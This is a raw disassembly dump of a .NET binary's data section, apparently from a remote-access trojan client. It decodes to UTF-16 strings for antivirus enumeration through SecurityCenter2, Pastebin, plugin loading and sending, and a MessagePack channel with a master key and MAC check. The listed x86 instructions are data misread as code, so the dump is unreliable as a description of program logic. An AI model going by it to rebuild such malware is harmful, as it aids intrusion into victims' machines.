  40c4b8:	00 73 00             	add    %dh,0x0(%ebx)
  40c4bb:	65 00 00             	add    %al,%gs:(%eax)
  40c4be:	0b 33                	or     (%ebx),%esi
  40c4c0:	00 32                	add    %dh,(%edx)
  40c4c2:	00 62 00             	add    %ah,0x0(%edx)
  40c4c5:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c4cb:	50                   	push   %eax
  40c4cc:	00 61 00             	add    %ah,0x0(%ecx)
  40c4cf:	74 00                	je     0x40c4d1
  40c4d1:	68 00 00 0f 56       	push   $0x560f0000
  40c4d6:	00 65 00             	add    %ah,0x0(%ebp)
  40c4d9:	72 00                	jb     0x40c4db
  40c4db:	73 00                	jae    0x40c4dd
  40c4dd:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c4e3:	00 0b                	add    %cl,(%ebx)
  40c4e5:	41                   	inc    %ecx
  40c4e6:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c4ea:	00 69 00             	add    %ch,0x0(%ecx)
  40c4ed:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4ee:	00 00                	add    %al,(%eax)
  40c4f0:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c4f4:	00 75 00             	add    %dh,0x0(%ebp)
  40c4f7:	65 00 00             	add    %al,%gs:(%eax)
  40c4fa:	0b 66 00             	or     0x0(%esi),%esp
  40c4fd:	61                   	popa
  40c4fe:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c502:	00 65 00             	add    %ah,0x0(%ebp)
  40c505:	00 17                	add    %dl,(%edi)
  40c507:	50                   	push   %eax
  40c508:	00 65 00             	add    %ah,0x0(%ebp)
  40c50b:	72 00                	jb     0x40c50d
  40c50d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c511:	72 00                	jb     0x40c513
  40c513:	6d                   	insl   (%dx),%es:(%edi)
  40c514:	00 61 00             	add    %ah,0x0(%ecx)
  40c517:	6e                   	outsb  %ds:(%esi),(%dx)
  40c518:	00 63 00             	add    %ah,0x0(%ebx)
  40c51b:	65 00 00             	add    %al,%gs:(%eax)
  40c51e:	11 50 00             	adc    %edx,0x0(%eax)
  40c521:	61                   	popa
  40c522:	00 73 00             	add    %dh,0x0(%ebx)
  40c525:	74 00                	je     0x40c527
  40c527:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c52b:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c531:	41                   	inc    %ecx
  40c532:	00 6e 00             	add    %ch,0x0(%esi)
  40c535:	74 00                	je     0x40c537
  40c537:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c53d:	72 00                	jb     0x40c53f
  40c53f:	75 00                	jne    0x40c541
  40c541:	73 00                	jae    0x40c543
  40c543:	00 13                	add    %dl,(%ebx)
  40c545:	49                   	dec    %ecx
  40c546:	00 6e 00             	add    %ch,0x0(%esi)
  40c549:	73 00                	jae    0x40c54b
  40c54b:	74 00                	je     0x40c54d
  40c54d:	61                   	popa
  40c54e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c552:	00 65 00             	add    %ah,0x0(%ebp)
  40c555:	64 00 00             	add    %al,%fs:(%eax)
  40c558:	09 50 00             	or     %edx,0x0(%eax)
  40c55b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c55c:	00 6e 00             	add    %ch,0x0(%esi)
  40c55f:	67 00 00             	add    %al,(%bx,%si)
  40c562:	0b 47 00             	or     0x0(%edi),%eax
  40c565:	72 00                	jb     0x40c567
  40c567:	6f                   	outsl  %ds:(%esi),(%dx)
  40c568:	00 75 00             	add    %dh,0x0(%ebp)
  40c56b:	70 00                	jo     0x40c56d
  40c56d:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c573:	00 2b                	add    %ch,(%ebx)
  40c575:	5c                   	pop    %esp
  40c576:	00 72 00             	add    %dh,0x0(%edx)
  40c579:	6f                   	outsl  %ds:(%esi),(%dx)
  40c57a:	00 6f 00             	add    %ch,0x0(%edi)
  40c57d:	74 00                	je     0x40c57f
  40c57f:	5c                   	pop    %esp
  40c580:	00 53 00             	add    %dl,0x0(%ebx)
  40c583:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c587:	75 00                	jne    0x40c589
  40c589:	72 00                	jb     0x40c58b
  40c58b:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c591:	43                   	inc    %ebx
  40c592:	00 65 00             	add    %ah,0x0(%ebp)
  40c595:	6e                   	outsb  %ds:(%esi),(%dx)
  40c596:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c59a:	00 72 00             	add    %dh,0x0(%edx)
  40c59d:	32 00                	xor    (%eax),%al
  40c59f:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c5a5:	6c                   	insb   (%dx),%es:(%edi)
  40c5a6:	00 65 00             	add    %ah,0x0(%ebp)
  40c5a9:	63 00                	arpl   %eax,(%eax)
  40c5ab:	74 00                	je     0x40c5ad
  40c5ad:	20 00                	and    %al,(%eax)
  40c5af:	2a 00                	sub    (%eax),%al
  40c5b1:	20 00                	and    %al,(%eax)
  40c5b3:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c5b7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5b8:	00 6d 00             	add    %ch,0x0(%ebp)
  40c5bb:	20 00                	and    %al,(%eax)
  40c5bd:	41                   	inc    %ecx
  40c5be:	00 6e 00             	add    %ch,0x0(%esi)
  40c5c1:	74 00                	je     0x40c5c3
  40c5c3:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c5c9:	72 00                	jb     0x40c5cb
  40c5cb:	75 00                	jne    0x40c5cd
  40c5cd:	73 00                	jae    0x40c5cf
  40c5cf:	50                   	push   %eax
  40c5d0:	00 72 00             	add    %dh,0x0(%edx)
  40c5d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5d4:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c5d8:	00 63 00             	add    %ah,0x0(%ebx)
  40c5db:	74 00                	je     0x40c5dd
  40c5dd:	00 17                	add    %dl,(%edi)
  40c5df:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c5e3:	73 00                	jae    0x40c5e5
  40c5e5:	70 00                	jo     0x40c5e7
  40c5e7:	6c                   	insb   (%dx),%es:(%edi)
  40c5e8:	00 61 00             	add    %ah,0x0(%ecx)
  40c5eb:	79 00                	jns    0x40c5ed
  40c5ed:	4e                   	dec    %esi
  40c5ee:	00 61 00             	add    %ah,0x0(%ecx)
  40c5f1:	6d                   	insl   (%dx),%es:(%edi)
  40c5f2:	00 65 00             	add    %ah,0x0(%ebp)
  40c5f5:	00 07                	add    %al,(%edi)
  40c5f7:	4e                   	dec    %esi
  40c5f8:	00 2f                	add    %ch,(%edi)
  40c5fa:	00 41 00             	add    %al,0x0(%ecx)
  40c5fd:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c603:	00 13                	add    %dl,(%ebx)
  40c605:	53                   	push   %ebx
  40c606:	00 6f 00             	add    %ch,0x0(%edi)
  40c609:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c60e:	00 61 00             	add    %ah,0x0(%ecx)
  40c611:	72 00                	jb     0x40c613
  40c613:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c618:	09 70 00             	or     %esi,0x0(%eax)
  40c61b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c61c:	00 6e 00             	add    %ch,0x0(%esi)
  40c61f:	67 00 00             	add    %al,(%bx,%si)
  40c622:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c627:	75 00                	jne    0x40c629
  40c629:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c62d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c62e:	00 00                	add    %al,(%eax)
  40c630:	15 73 00 61 00       	adc    $0x610073,%eax
  40c635:	76 00                	jbe    0x40c637
  40c637:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c63b:	6c                   	insb   (%dx),%es:(%edi)
  40c63c:	00 75 00             	add    %dh,0x0(%ebp)
  40c63f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c643:	6e                   	outsb  %ds:(%esi),(%dx)
  40c644:	00 00                	add    %al,(%eax)
  40c646:	07                   	pop    %es
  40c647:	44                   	inc    %esp
  40c648:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c64c:	00 00                	add    %al,(%eax)
  40c64e:	15 73 00 65 00       	adc    $0x650073,%eax
  40c653:	6e                   	outsb  %ds:(%esi),(%dx)
  40c654:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c658:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c65c:	00 67 00             	add    %ah,0x0(%edi)
  40c65f:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c665:	48                   	dec    %eax
  40c666:	00 61 00             	add    %ah,0x0(%ecx)
  40c669:	73 00                	jae    0x40c66b
  40c66b:	68 00 65 00 73       	push   $0x73006500
  40c670:	00 00                	add    %al,(%eax)
  40c672:	09 48 00             	or     %ecx,0x0(%eax)
  40c675:	61                   	popa
  40c676:	00 73 00             	add    %dh,0x0(%ebx)
  40c679:	68 00 00 1b 50       	push   $0x501b0000
  40c67e:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c682:	00 67 00             	add    %ah,0x0(%edi)
  40c685:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c68b:	50                   	push   %eax
  40c68c:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c690:	00 67 00             	add    %ah,0x0(%edi)
  40c693:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c699:	52                   	push   %edx
  40c69a:	00 75 00             	add    %dh,0x0(%ebp)
  40c69d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c69e:	00 00                	add    %al,(%eax)
  40c6a0:	0f 4d 00             	cmovge (%eax),%eax
  40c6a3:	73 00                	jae    0x40c6a5
  40c6a5:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c6a9:	61                   	popa
  40c6aa:	00 63 00             	add    %ah,0x0(%ebx)
  40c6ad:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c6b0:	11 52 00             	adc    %edx,0x0(%edx)
  40c6b3:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c6b7:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c6bb:	76 00                	jbe    0x40c6bd
  40c6bd:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c6c2:	0b 45 00             	or     0x0(%ebp),%eax
  40c6c5:	72 00                	jb     0x40c6c7
  40c6c7:	72 00                	jb     0x40c6c9
  40c6c9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6ca:	00 72 00             	add    %dh,0x0(%edx)
  40c6cd:	00 47 6d             	add    %al,0x6d(%edi)
  40c6d0:	00 61 00             	add    %ah,0x0(%ecx)
  40c6d3:	73 00                	jae    0x40c6d5
  40c6d5:	74 00                	je     0x40c6d7
  40c6d7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c6db:	4b                   	dec    %ebx
  40c6dc:	00 65 00             	add    %ah,0x0(%ebp)
  40c6df:	79 00                	jns    0x40c6e1
  40c6e1:	20 00                	and    %al,(%eax)
  40c6e3:	63 00                	arpl   %eax,(%eax)
  40c6e5:	61                   	popa
  40c6e6:	00 6e 00             	add    %ch,0x0(%esi)
  40c6e9:	20 00                	and    %al,(%eax)
  40c6eb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6ec:	00 6f 00             	add    %ch,0x0(%edi)
  40c6ef:	74 00                	je     0x40c6f1
  40c6f1:	20 00                	and    %al,(%eax)
  40c6f3:	62 00                	bound  %eax,(%eax)
  40c6f5:	65 00 20             	add    %ah,%gs:(%eax)
  40c6f8:	00 6e 00             	add    %ch,0x0(%esi)
  40c6fb:	75 00                	jne    0x40c6fd
  40c6fd:	6c                   	insb   (%dx),%es:(%edi)
  40c6fe:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c702:	00 6f 00             	add    %ch,0x0(%edi)
  40c705:	72 00                	jb     0x40c707
  40c707:	20 00                	and    %al,(%eax)
  40c709:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c70d:	70 00                	jo     0x40c70f
  40c70f:	74 00                	je     0x40c711
  40c711:	79 00                	jns    0x40c713
  40c713:	2e 00 00             	add    %al,%cs:(%eax)
  40c716:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c71b:	70 00                	jo     0x40c71d
  40c71d:	75 00                	jne    0x40c71f
  40c71f:	74 00                	je     0x40c721
  40c721:	20 00                	and    %al,(%eax)
  40c723:	63 00                	arpl   %eax,(%eax)
  40c725:	61                   	popa
  40c726:	00 6e 00             	add    %ch,0x0(%esi)
  40c729:	20 00                	and    %al,(%eax)
  40c72b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c72c:	00 6f 00             	add    %ch,0x0(%edi)
  40c72f:	74 00                	je     0x40c731
  40c731:	20 00                	and    %al,(%eax)
  40c733:	62 00                	bound  %eax,(%eax)
  40c735:	65 00 20             	add    %ah,%gs:(%eax)
  40c738:	00 6e 00             	add    %ch,0x0(%esi)
  40c73b:	75 00                	jne    0x40c73d
  40c73d:	6c                   	insb   (%dx),%es:(%edi)
  40c73e:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c742:	00 00                	add    %al,(%eax)
  40c744:	55                   	push   %ebp
  40c745:	49                   	dec    %ecx
  40c746:	00 6e 00             	add    %ch,0x0(%esi)
  40c749:	76 00                	jbe    0x40c74b
  40c74b:	61                   	popa
  40c74c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c750:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c754:	00 6d 00             	add    %ch,0x0(%ebp)
  40c757:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c75b:	73 00                	jae    0x40c75d
  40c75d:	61                   	popa
  40c75e:	00 67 00             	add    %ah,0x0(%edi)
  40c761:	65 00 20             	add    %ah,%gs:(%eax)
  40c764:	00 61 00             	add    %ah,0x0(%ecx)
  40c767:	75 00                	jne    0x40c769
  40c769:	74 00                	je     0x40c76b
  40c76b:	68 00 65 00 6e       	push   $0x6e006500
  40c770:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c774:	00 63 00             	add    %ah,0x0(%ebx)
  40c777:	61                   	popa
  40c778:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c77c:	00 6f 00             	add    %ch,0x0(%edi)
  40c77f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c780:	00 20                	add    %ah,(%eax)
  40c782:	00 63 00             	add    %ah,0x0(%ebx)
  40c785:	6f                   	outsl  %ds:(%esi),(%dx)
  40c786:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c78a:	00 20                	add    %ah,(%eax)
  40c78c:	00 28                	add    %ch,(%eax)
  40c78e:	00 4d 00             	add    %cl,0x0(%ebp)
  40c791:	41                   	inc    %ecx
  40c792:	00 43 00             	add    %al,0x0(%ebx)
  40c795:	29 00                	sub    %eax,(%eax)
  40c797:	2e 00 00             	add    %al,%cs:(%eax)
  40c79a:	05 58 00 32 00       	add    $0x320058,%eax
  40c79f:	00 0f                	add    %cl,(%edi)
  40c7a1:	7b 00                	jnp    0x40c7a3
  40c7a3:	30 00                	xor    %al,(%eax)
  40c7a5:	3a 00                	cmp    (%eax),%al
  40c7a7:	44                   	inc    %esp
  40c7a8:	00 33                	add    %dh,(%ebx)
  40c7aa:	00 7d 00             	add    %bh,0x0(%ebp)
  40c7ad:	20 00                	and    %al,(%eax)
  40c7af:	00 0f                	add    %cl,(%edi)
  40c7b1:	7b 00                	jnp    0x40c7b3
  40c7b3:	30 00                	xor    %al,(%eax)
  40c7b5:	3a 00                	cmp    (%eax),%al
  40c7b7:	58                   	pop    %eax
  40c7b8:	00 32                	add    %dh,(%edx)
  40c7ba:	00 7d 00             	add    %bh,0x0(%ebp)
  40c7bd:	20 00                	and    %al,(%eax)
  40c7bf:	00 2b                	add    %ch,(%ebx)
  40c7c1:	28 00                	sub    %al,(%eax)
  40c7c3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c7c4:	00 65 00             	add    %ah,0x0(%ebp)
  40c7c7:	76 00                	jbe    0x40c7c9
  40c7c9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c7cd:	20 00                	and    %al,(%eax)
  40c7cf:	75 00                	jne    0x40c7d1
  40c7d1:	73 00                	jae    0x40c7d3
  40c7d3:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c7d8:	00 20                	add    %ah,(%eax)
  40c7da:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c7de:	00 70 00             	add    %dh,0x0(%eax)
  40c7e1:	65 00 20             	add    %ah,%gs:(%eax)
  40c7e4:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c7e7:	63 00                	arpl   %eax,(%eax)
  40c7e9:	31 00                	xor    %eax,(%eax)
  40c7eb:	00 45 28             	add    %al,0x28(%ebp)
  40c7ee:	00 65 00             	add    %ah,0x0(%ebp)
  40c7f1:	78 00                	js     0x40c7f3
  40c7f3:	74 00                	je     0x40c7f5
  40c7f5:	38 00                	cmp    %al,(%eax)
  40c7f7:	2c 00                	sub    $0x0,%al
  40c7f9:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c7fd:	74 00                	je     0x40c7ff
  40c7ff:	31 00                	xor    %eax,(%eax)
  40c801:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c805:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c809:	33 00                	xor    (%eax),%eax
  40c80b:	32 00                	xor    (%eax),%al
  40c80d:	29 00                	sub    %eax,(%eax)
  40c80f:	20 00                	and    %al,(%eax)
  40c811:	74 00                	je     0x40c813
  40c813:	79 00                	jns    0x40c815
  40c815:	70 00                	jo     0x40c817
  40c817:	65 00 20             	add    %ah,%gs:(%eax)
  40c81a:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c81d:	63 00                	arpl   %eax,(%eax)
  40c81f:	37                   	aaa
  40c820:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c823:	24 00                	and    $0x0,%al
  40c825:	63 00                	arpl   %eax,(%eax)
  40c827:	38 00                	cmp    %al,(%eax)
  40c829:	2c 00                	sub    $0x0,%al
  40c82b:	24 00                	and    $0x0,%al
  40c82d:	63 00                	arpl   %eax,(%eax)
  40c82f:	39 00                	cmp    %eax,(%eax)
  40c831:	00 00                	add    %al,(%eax)
  40c833:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c836:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c83a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c83d:	24 f5                	and    $0xf5,%al
  40c83f:	ac                   	lods   %ds:(%esi),%al
  40c840:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c847:	7a 5c                	jp     0x40c8a5
  40c849:	56                   	push   %esi
  40c84a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c84d:	89 03                	mov    %eax,(%ebx)
  40c84f:	00 00                	add    %al,(%eax)
  40c851:	01 03                	add    %eax,(%ebx)
  40c853:	20 00                	and    %al,(%eax)
  40c855:	01 02                	add    %eax,(%edx)
  40c857:	06                   	push   %es
  40c858:	0e                   	push   %cs
  40c859:	03 06                	add    (%esi),%eax
  40c85b:	12 09                	adc    (%ecx),%cl
  40c85d:	03 06                	add    (%esi),%eax
  40c85f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c863:	00 02                	add    %al,(%edx)
  40c865:	03 06                	add    (%esi),%eax
  40c867:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c86d:	03 06                	add    (%esi),%eax
  40c86f:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c874:	03 06                	add    (%esi),%eax
  40c876:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c87c:	06                   	push   %es
  40c87d:	1c 02                	sbb    $0x2,%al
  40c87f:	06                   	push   %es
  40c880:	08 04 00             	or     %al,(%eax,%eax,1)
  40c883:	00 12                	add    %dl,(%edx)
  40c885:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c88a:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c890:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c896:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c899:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c89f:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c8a5:	0a 04 00             	or     (%eax,%eax,1),%al
  40c8a8:	01 01                	add    %eax,(%ecx)
  40c8aa:	0a 04 00             	or     (%eax,%eax,1),%al
  40c8ad:	00 12                	add    %dl,(%edx)
  40c8af:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c8b4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c8ba:	02 03                	add    (%ebx),%al
  40c8bc:	00 00                	add    %al,(%eax)
  40c8be:	1c 03                	sbb    $0x3,%al
  40c8c0:	00 00                	add    %al,(%eax)
  40c8c2:	08 04 00             	or     %al,(%eax,%eax,1)
  40c8c5:	01 01                	add    %eax,(%ecx)
  40c8c7:	08 04 00             	or     %al,(%eax,%eax,1)
  40c8ca:	01 02                	add    %eax,(%edx)
  40c8cc:	0e                   	push   %cs
  40c8cd:	0a 00                	or     (%eax),%al
  40c8cf:	04 02                	add    $0x2,%al
  40c8d1:	1c 12                	sbb    $0x12,%al
  40c8d3:	19 12                	sbb    %edx,(%edx)
  40c8d5:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c8da:	01 01                	add    %eax,(%ecx)
  40c8dc:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c8e2:	1c 04                	sbb    $0x4,%al
  40c8e4:	08 00                	or     %al,(%eax)
  40c8e6:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c8ec:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c8ef:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c8f5:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c8f8:	00 12                	add    %dl,(%edx)
  40c8fa:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c8ff:	03 08                	add    (%eax),%ecx
  40c901:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c904:	08 00                	or     %al,(%eax)
  40c906:	08 03                	or     %al,(%ebx)
  40c908:	00 00                	add    %al,(%eax)
  40c90a:	0e                   	push   %cs
  40c90b:	04 00                	add    $0x0,%al
  40c90d:	01 0e                	add    %ecx,(%esi)
  40c90f:	0e                   	push   %cs
  40c910:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c916:	d5 0a                	aad    $0xa
  40c918:	3a 06                	cmp    (%esi),%al
  40c91a:	00 01                	add    %al,(%ecx)
  40c91c:	12 29                	adc    (%ecx),%ch
  40c91e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c924:	03 00                	add    (%eax),%eax
  40c926:	00 18                	add    %bl,(%eax)
  40c928:	07                   	pop    %es
  40c929:	00 03                	add    %al,(%ebx)
  40c92b:	08 18                	or     %bl,(%eax)
  40c92d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c933:	18 0e                	sbb    %cl,(%esi)
  40c935:	06                   	push   %es
  40c936:	00 02                	add    %al,(%edx)
  40c938:	02 18                	add    (%eax),%bl
  40c93a:	10 02                	adc    %al,(%edx)
  40c93c:	06                   	push   %es
  40c93d:	00 01                	add    %al,(%ecx)
  40c93f:	11 30                	adc    %esi,(%eax)
  40c941:	11 30                	adc    %esi,(%eax)
  40c943:	06                   	push   %es
  40c944:	00 03                	add    %al,(%ebx)
  40c946:	01 09                	add    %ecx,(%ecx)
  40c948:	09 09                	or     %ecx,(%ecx)
  40c94a:	02 06                	add    (%esi),%al
  40c94c:	09 03                	or     %eax,(%ebx)
  40c94e:	06                   	push   %es
  40c94f:	11 30                	adc    %esi,(%eax)
  40c951:	04 00                	add    $0x0,%al
  40c953:	00 00                	add    %al,(%eax)
  40c955:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c959:	00 00                	add    %al,(%eax)
  40c95b:	04 01                	add    $0x1,%al
  40c95d:	00 00                	add    %al,(%eax)
  40c95f:	00 06                	add    %al,(%esi)
  40c961:	00 02                	add    %al,(%edx)
  40c963:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c966:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c96b:	0e                   	push   %cs
  40c96c:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c971:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c976:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c97b:	60                   	pusha
  40c97c:	05 00 01 01 12       	add    $0x12010100,%eax
  40c981:	60                   	pusha
  40c982:	04 00                	add    $0x0,%al
  40c984:	01 01                	add    %eax,(%ecx)
  40c986:	0e                   	push   %cs
  40c987:	18 06                	sbb    %al,(%esi)
  40c989:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c98e:	12 49 0a             	adc    0xa(%ecx),%cl
  40c991:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c994:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c99a:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c99f:	0e                   	push   %cs
  40c9a0:	04 20                	add    $0x20,%al
  40c9a2:	00 00                	add    %al,(%eax)
  40c9a4:	00 04 40             	add    %al,(%eax,%eax,2)
  40c9a7:	00 00                	add    %al,(%eax)
  40c9a9:	00 04 10             	add    %al,(%eax,%edx,1)
  40c9ac:	00 00                	add    %al,(%eax)
  40c9ae:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c9b1:	01 01                	add    %eax,(%ecx)
  40c9b3:	0e                   	push   %cs
  40c9b4:	04 20                	add    $0x20,%al
  40c9b6:	01 0e                	add    %ecx,(%esi)
  40c9b8:	0e                   	push   %cs
  40c9b9:	06                   	push   %es
  40c9ba:	20 01                	and    %al,(%ecx)
  40c9bc:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c9c1:	20 02                	and    %al,(%edx)
  40c9c3:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c9c9:	00 01                	add    %al,(%ecx)
  40c9cb:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c9d0:	06                   	push   %es
  40c9d1:	11 50 03             	adc    %edx,0x3(%eax)
  40c9d4:	06                   	push   %es
  40c9d5:	12 55 05             	adc    0x5(%ebp),%dl
  40c9d8:	00 01                	add    %al,(%ecx)
  40c9da:	0e                   	push   %cs
  40c9db:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c9e0:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c9e5:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c9eb:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c9f1:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c9f7:	01 01                	add    %eax,(%ecx)
  40c9f9:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c9fe:	60                   	pusha
  40c9ff:	03 20                	add    (%eax),%esp
  40ca01:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40ca04:	20 00                	and    %al,(%eax)
  40ca06:	02 03                	add    (%ebx),%al
  40ca08:	28 00                	sub    %al,(%eax)
  40ca0a:	1c 03                	sbb    $0x3,%al
  40ca0c:	06                   	push   %es
  40ca0d:	12 60 0b             	adc    0xb(%eax),%ah
  40ca10:	20 02                	and    %al,(%edx)
  40ca12:	01 12                	add    %edx,(%edx)
  40ca14:	60                   	pusha
  40ca15:	15 12 41 01 12       	adc    $0x12014112,%eax
  40ca1a:	60                   	pusha
  40ca1b:	04 20                	add    $0x20,%al
  40ca1d:	00 12                	add    %dl,(%edx)
  40ca1f:	60                   	pusha
  40ca20:	05 20 01 12 60       	add    $0x60120120,%eax
  40ca25:	0e                   	push   %cs
  40ca26:	05 20 01 12 60       	add    $0x60120120,%eax
  40ca2b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40ca31:	0d 05 20 01 12       	or     $0x12012005,%eax
  40ca36:	60                   	pusha
  40ca37:	08 03                	or     %al,(%ebx)
  40ca39:	20 00                	and    %al,(%eax)
  40ca3b:	08 05 28 01 12 60    	or     %al,0x60120128
  40ca41:	08 03                	or     %al,(%ebx)
  40ca43:	28 00                	sub    %al,(%eax)
  40ca45:	08 03                	or     %al,(%ebx)
  40ca47:	06                   	push   %es
  40ca48:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40ca4c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40ca50:	01 08                	add    %ecx,(%eax)
  40ca52:	0e                   	push   %cs
  40ca53:	05 20 01 01 12       	add    $0x12010120,%eax
  40ca58:	61                   	popa
  40ca59:	04 20                	add    $0x20,%al
  40ca5b:	01 01                	add    %eax,(%ecx)
  40ca5d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40ca60:	01 01                	add    %eax,(%ecx)
  40ca62:	0b 03                	or     (%ebx),%eax
  40ca64:	20 00                	and    %al,(%eax)
  40ca66:	0b 03                	or     (%ebx),%eax
  40ca68:	20 00                	and    %al,(%eax)
  40ca6a:	0a 03                	or     (%ebx),%al
  40ca6c:	20 00                	and    %al,(%eax)
